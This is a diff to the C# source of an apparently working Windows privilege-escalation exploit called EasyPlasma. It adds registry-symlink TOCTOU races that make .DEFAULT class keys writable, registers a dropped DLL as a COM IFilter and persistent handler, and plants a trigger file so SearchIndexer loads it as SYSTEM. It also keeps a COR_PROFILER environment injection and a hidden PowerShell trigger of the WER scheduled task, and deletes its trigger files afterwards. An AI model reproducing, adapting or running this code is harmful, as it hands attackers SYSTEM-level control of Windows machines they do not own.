@@ -41,6 +41,8 @@ class EasyPlasma
     [DllImport("ntdll.dll")]  static extern int NtSetSecurityObject(IntPtr h, uint i, IntPtr sd);
     [DllImport("ntdll.dll")]  static extern int NtSetValueKey(IntPtr h, ref US n, int ti, uint t, byte[] d, int l);
     [DllImport("ntdll.dll")]  static extern int NtDeleteKey(IntPtr h);
+    [DllImport("ntdll.dll")]  static extern int NtCreateKey(out IntPtr h, uint access, ref OA oa, int ti, IntPtr cls, uint options, out uint disp);
+    [DllImport("shell32.dll")] static extern void SHChangeNotify(int ev, uint flags, string item1, IntPtr item2);
     [DllImport("ntdll.dll")]  static extern int NtClose(IntPtr h);
     [DllImport("kernel32.dll")] static extern IntPtr GetCurrentThread();
     [DllImport("kernel32.dll")] static extern uint GetCurrentThreadId();
@@ -249,10 +251,10 @@ if($r-eq 0){
         Console.Write("    S2 TOCTOU: "); RunToctou();
         Console.WriteLine("[+] Stage 2 done");
 
-        Console.WriteLine("[*] Stage 3: COR_PROFILER injection via VE...");
+        Console.WriteLine("[*] Stage 3: SearchIndexer IFilter COM hijacking...");
         MakeWritable(TK); Thread.Sleep(200);
 
-        /* Drop stub.dll to disk */
+        /* Drop stub.dll as the IFilter profiler DLL */
         string dllPath = Path.Combine(
             Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),
             "ep_prof.dll");
@@ -261,93 +263,82 @@ if($r-eq 0){
             if (s != null) {
                 byte[] b = new byte[s.Length]; s.Read(b, 0, b.Length);
                 File.WriteAllBytes(dllPath, b);
-                Console.WriteLine($"[+] Dropped profiler DLL -> {dllPath}");
+                Console.WriteLine($"[+] DLL -> {dllPath}");
             }
         }
 
-        /* Write COR_PROFILER vars to VE so any SYSTEM .NET process loads our DLL */
-        bool wrote = false;
+        /* Keep COR_PROFILER in VE for any future .NET SYSTEM process */
         IntPtr hTK = OKey(TK, KEY_SET_VALUE);
         if (hTK!=IntPtr.Zero) {
-            var vals = new (string name, string val)[] {
-                ("COR_ENABLE_PROFILING", "1"),
-                ("COR_PROFILER",         "{00000000-1111-2222-3333-444444444444}"),
-                ("COR_PROFILER_PATH",    dllPath),
-                /* Keep windir too for WER fallback */
-                ("windir",    runDir),
-                ("SystemRoot",runDir),
-            };
-            foreach (var (name, val) in vals) {
-                var vn = new US(name);
-                var wb = System.Text.Encoding.Unicode.GetBytes(val+"\0");
-                if (NtSetValueKey(hTK,ref vn,0,REG_SZ,wb,wb.Length)==0) wrote=true;
-                vn.Free();
+            foreach (var (n,v) in new[]{
+                ("COR_ENABLE_PROFILING","1"),
+                ("COR_PROFILER",        "{00000000-1111-2222-3333-444444444444}"),
+                ("COR_PROFILER_PATH",   dllPath) }) {
+                var vn=new US(n); var wb=System.Text.Encoding.Unicode.GetBytes(v+"\0");
+                NtSetValueKey(hTK,ref vn,0,REG_SZ,wb,wb.Length); vn.Free();
             }
             NtClose(hTK);
         }
-        if (!wrote){Console.WriteLine("[-] VE write failed");return false;}
-        Console.WriteLine("[+] COR_PROFILER set in VE");
 
-        PreparePayload(runDir); /* also drop WER stubs for fallback */
+        /* IFilter registration in .DEFAULT\Software\Classes via two more TOCTOU runs */
+        const string EP_GUID = "{EEB02C9D-1234-5678-ABCD-EF0123456789}";
+        const string EP_EXT  = ".eptest";
+        string clsidKey  = string.Join("\\", _reg, "Software","Classes","CLSID",EP_GUID);
+        string inprocKey = clsidKey + "\\InProcServer32";
+        string extKey    = string.Join("\\", _reg, "Software","Classes",EP_EXT);
+        string phKey     = extKey + "\\PersistentHandler";
 
-        /* Trigger mscorsvw.exe (NGEN) as SYSTEM - it hosts CLR and will load our profiler DLL */
-        Console.WriteLine("[*] Triggering .NET NGEN task (mscorsvw.exe as SYSTEM)...");
-        /* Add fake dir to start of PATH so wermgr.exe loads our DLLs by name */
-        string sysPath = Environment.GetEnvironmentVariable("PATH") ?? "";
-        string fakePath = Path.Combine(runDir,"System32");
-        IntPtr hTK2 = OKey(TK, KEY_SET_VALUE);
-        if (hTK2!=IntPtr.Zero) {
-            var vn = new US("PATH");
-            string newPath = fakePath + ";" + sysPath;
-            var wb = System.Text.Encoding.Unicode.GetBytes(newPath+"\0");
-            NtSetValueKey(hTK2,ref vn,0,REG_SZ,wb,wb.Length); vn.Free();
-            NtClose(hTK2);
-            Console.WriteLine($"[+] PATH in VE: {fakePath};...");
+        /* TOCTOU 3: create .DEFAULT\Software\Classes\CLSID\{EP_GUID} world-writable */
+        RecDelete(BA); Thread.Sleep(300);
+        CreateSymlinkPS(BA, clsidKey);
+        Console.Write("    TOCTOU(CLSID): "); RunToctou();
+
+        /* Create InProcServer32 subkey and register our DLL */
+        {
+            var oa = new OA(inprocKey, OBJ_CASE_INSENSITIVE);
+            IntPtr hK; uint disp;
+            int r = NtCreateKey(out hK, KEY_ALL_ACCESS, ref oa, 0, IntPtr.Zero, 0, out disp);
+            oa.Free();
+            if (r==0 && hK!=IntPtr.Zero) {
+                var vn=new US(""); var wb=System.Text.Encoding.Unicode.GetBytes(dllPath+"\0");
+                NtSetValueKey(hK,ref vn,0,REG_SZ,wb,wb.Length); vn.Free();
+                var tm=new US("ThreadingModel"); var tb=System.Text.Encoding.Unicode.GetBytes("Both\0");
+                NtSetValueKey(hK,ref tm,0,REG_SZ,tb,tb.Length); tm.Free();
+                NtClose(hK);
+                Console.WriteLine($"[+] InProcServer32 registered (0x{r:X})");
+            } else Console.WriteLine($"[-] InProcServer32 create failed: 0x{r:X8}");
         }
 
-        /* Drop stub.dll under common DLL names wermgr.exe might load */
-        string[] dllNames = {"wlbsctrl.dll","wbemcomn.dll","dbgcore.dll","version.dll","netutils.dll"};
-        foreach (var d in dllNames)
-            try { File.Copy(dllPath, Path.Combine(fakePath,d), true); } catch {}
-        Console.WriteLine($"[+] Dropped stub.dll as {dllNames.Length} candidate DLLs");
+        /* TOCTOU 4: create .DEFAULT\Software\Classes\.eptest world-writable */
+        RecDelete(BA); Thread.Sleep(300);
+        CreateSymlinkPS(BA, extKey);
+        Console.Write("    TOCTOU(EXT): "); RunToctou();
 
-        /* Enumerate ALL SYSTEM tasks across all folders - find any that run .NET (powershell, mscorsvw, etc.) */
-        string findTasksPs =
-            "function Scan($f){" +
-            "  foreach($t in $f.GetTasks(0)){" +
-            "    foreach($a in $t.Definition.Actions){" +
-            "      if($a.Type -eq 0 -and ($a.Path -match 'powershell|mscorsvw|csc\\.exe|vbc\\.exe')){" +
-            "        Write-Host('[dotnet]'+$t.Path+' -> '+$a.Path)" +
-            "      }" +
-            "    }" +
-            "  }" +
-            "  foreach($sf in $f.GetFolders(0)){Scan $sf}" +
-            "}" +
-            "$s=New-Object -ComObject Schedule.Service;$s.Connect();" +
-            "Scan($s.GetFolder('\\'))";
-        var fpsi = new System.Diagnostics.ProcessStartInfo("powershell.exe",
-            $"-NoProfile -NonInteractive -WindowStyle Hidden -Command \"{findTasksPs}\"")
-            {UseShellExecute=false,CreateNoWindow=true,RedirectStandardOutput=true,RedirectStandardError=true};
-        string foundTasks = "";
-        using(var p=System.Diagnostics.Process.Start(fpsi)) {
-            foundTasks = p.StandardOutput.ReadToEnd()+p.StandardError.ReadToEnd(); p.WaitForExit(15000);
-        }
-        Console.WriteLine($"[*] .NET SYSTEM tasks found:\n{foundTasks.Trim()}");
-
-        /* Trigger any powershell SYSTEM task we found */
-        if (foundTasks.Contains("[dotnet]")) {
-            string line = foundTasks.Split('\n')[0];
-            string taskPath = line.Replace("[dotnet]","").Split('>')[0].Trim();
-            string runPs = $"$s=New-Object -ComObject Schedule.Service;$s.Connect();" +
-                           $"$t=$s.GetFolder('\\').GetTask('{taskPath}');$t.Run($null)";
-            var rpsi = new System.Diagnostics.ProcessStartInfo("powershell.exe",
-                $"-NoProfile -NonInteractive -WindowStyle Hidden -Command \"{runPs}\"")
-                {UseShellExecute=false,CreateNoWindow=true};
-            using(var p=System.Diagnostics.Process.Start(rpsi)) p.WaitForExit(5000);
-            Console.WriteLine($"[+] Triggered: {taskPath}");
+        /* Create PersistentHandler subkey pointing to our CLSID */
+        {
+            var oa = new OA(phKey, OBJ_CASE_INSENSITIVE);
+            IntPtr hK; uint disp;
+            int r = NtCreateKey(out hK, KEY_ALL_ACCESS, ref oa, 0, IntPtr.Zero, 0, out disp);
+            oa.Free();
+            if (r==0 && hK!=IntPtr.Zero) {
+                var vn=new US(""); var wb=System.Text.Encoding.Unicode.GetBytes(EP_GUID+"\0");
+                NtSetValueKey(hK,ref vn,0,REG_SZ,wb,wb.Length); vn.Free();
+                NtClose(hK);
+                Console.WriteLine($"[+] .eptest PersistentHandler = {EP_GUID}");
+            } else Console.WriteLine($"[-] PersistentHandler create failed: 0x{r:X8}");
         }
 
-        /* Also trigger WER as fallback */
+        /* Drop trigger file in Documents - SearchIndexer will pick it up and load our IFilter */
+        string docs = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
+        string triggerFile = Path.Combine(docs, "ep_trigger.eptest");
+        File.WriteAllText(triggerFile, "EasyPlasma");
+        Console.WriteLine($"[+] Trigger: {triggerFile}");
+        /* Notify shell so SearchIndexer sees the new file immediately */
+        SHChangeNotify(0x00000002 /*SHCNE_CREATE*/, 0x0005 /*SHCNF_PATHW*/, triggerFile, IntPtr.Zero);
+        Console.WriteLine("[*] SearchIndexer notified, waiting for DLL load...");
+
+        /* WER fallback: still try in case wermgr.exe actually loads our DLLs */
+        PreparePayload(runDir);
         string werPs = "$s=New-Object -ComObject Schedule.Service;$s.Connect();" +
                     "$t=$s.GetFolder('\\Microsoft\\Windows\\Windows Error Reporting').GetTask('QueueReporting');" +
                     "$t.Run($null)";
@@ -355,7 +346,7 @@ if($r-eq 0){
             $"-NoProfile -NonInteractive -WindowStyle Hidden -Command \"{werPs}\"")
             {UseShellExecute=false,CreateNoWindow=true};
         using(var p=System.Diagnostics.Process.Start(wpsi)) p.WaitForExit(5000);
-        Console.WriteLine("[+] WER triggered (fallback)");
+        Console.WriteLine("[+] WER also triggered");
         return true;
     }
 
@@ -778,8 +769,11 @@ if($r-eq 0){
 
         /* Wait for SYSTEM wermgr.exe to connect (give WER up to 25s to fire) */
         Console.WriteLine("[*] Waiting for SYSTEM to connect...");
-        if (!escPipe.WaitForConnectionAsync().Wait(25000)) {
+        if (!escPipe.WaitForConnectionAsync().Wait(45000)) {
             Console.WriteLine("[-] Timed out waiting for SYSTEM");
+            string trigClean = Path.Combine(
+                Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), "ep_trigger.eptest");
+            try{File.Delete(trigClean);}catch{}
             escPipe.Dispose();
             try{RecDelete(CF);}catch{}
             try{RecDelete(TK);}catch{}
@@ -827,9 +821,12 @@ if($r-eq 0){
         uint session = WTSGetActiveConsoleSessionId();
         SetTokenInformation(systemToken, 12, ref session, 4);
 
-        /* Signal SYSTEM wermgr.exe that it can exit */
+        /* Signal SYSTEM process that it can exit */
         try { escPipe.Write(new byte[]{1}, 0, 1); escPipe.Flush(); } catch {}
         escPipe.Dispose();
+        string trigDone = Path.Combine(
+            Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), "ep_trigger.eptest");
+        try{File.Delete(trigDone);}catch{}
 
         /* Clean up everything now that SYSTEM has connected and been launched */
         Thread.Sleep(500);
